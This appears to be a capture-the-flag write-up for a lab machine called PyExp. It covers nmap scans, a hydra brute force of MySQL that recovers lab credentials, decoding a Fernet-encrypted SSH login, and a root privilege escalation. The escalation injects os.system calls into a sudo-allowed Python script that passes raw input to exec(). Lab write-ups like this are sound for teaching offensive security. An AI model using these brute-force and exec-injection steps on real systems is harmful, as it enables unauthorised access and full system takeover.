# PyExp

OS: Linux 

Difficulties: easy

## summary
things learnt:
 - mysql brute force
 - database enuemration
 - fernet decode
 - python `exec()` exploitation
 
## Open ports

```
# Nmap 7.91 scan initiated Thu Jan 14 03:47:30 2021 as: nmap -sC -sV -oA nmap/initial 192.168.144.118
Nmap scan report for 192.168.144.118
Host is up (0.27s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.23-MariaDB-0+deb10u1
|   Thread ID: 39
|   Capabilities flags: 63486
|   Some Capabilities: DontAllowDatabaseTableColumn, Support41Auth, SupportsCompression, SupportsLoadDataLocal, Speaks41ProtocolNew, Speaks41ProtocolOld, IgnoreSigpipes, LongColumnFlag, FoundRows, InteractiveClient, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsTransactions, ODBCClient, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: ]w_Wug'(5mH`*P5U,{H7
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 14 03:47:47 2021 -- 1 IP address (1 host up) scanned in 17.76 seconds
```

```
# Nmap 7.91 scan initiated Thu Jan 14 03:48:05 2021 as: nmap -sC -sV -oA nmap/full -p- 192.168.144.118
Nmap scan report for 192.168.144.118
Host is up (0.27s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f7:af:6c:d1:26:94:dc:e5:1a:22:1a:64:4e:1c:34:a9 (RSA)
|   256 46:d2:8d:bd:2f:9e:af:ce:e2:45:5c:a6:12:c0:d9:19 (ECDSA)
|_  256 8d:11:ed:ff:7d:c5:a7:24:99:22:7f:ce:29:88:b2:4a (ED25519)
3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.23-MariaDB-0+deb10u1
|   Thread ID: 4539
|   Capabilities flags: 63486
|   Some Capabilities: ODBCClient, SupportsCompression, FoundRows, IgnoreSpaceBeforeParenthesis, Support41Auth, SupportsTransactions, Speaks41ProtocolOld, SupportsLoadDataLocal, ConnectWithDatabase, LongColumnFlag, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: C`9;Z8E1f0YPd'5q^bOF
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 14 04:17:35 2021 -- 1 IP address (1 host up) scanned in 1769.98 seconds
```

## Findings 
using hydra to bruteforce the password for mysql. get root:prettywoman
enumerate database, found a table named "fernet"
content: 
| cred                                                                                                                     | keyy                                         |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |

use https://asecuritysite.com/encryption/ferdecode to decode the message, get:
lucy:wJ9`"Lemdv9[FEw-

this might be linux login credential. try to ssh using it. and we get user.

## Credentials
mysql 
root:prettywoman

ssh
lucy:wJ9`"Lemdv9[FEw-

## Privesc

run `sudo -l` and get:
```
lucy@pyexp:~$ sudo -l
Matching Defaults entries for lucy on pyexp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucy may run the following commands on pyexp:
    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py
```

check /opt/exp.py:
```python
uinput = raw_input('how are you?')
exec(uinput)
```

poc:
```bash
lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py
how are you?import os;os.system('whoami')
root
```

shell:
```bash
lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py
how are you?import os;os.system('bash')
root@pyexp:/home/lucy#
```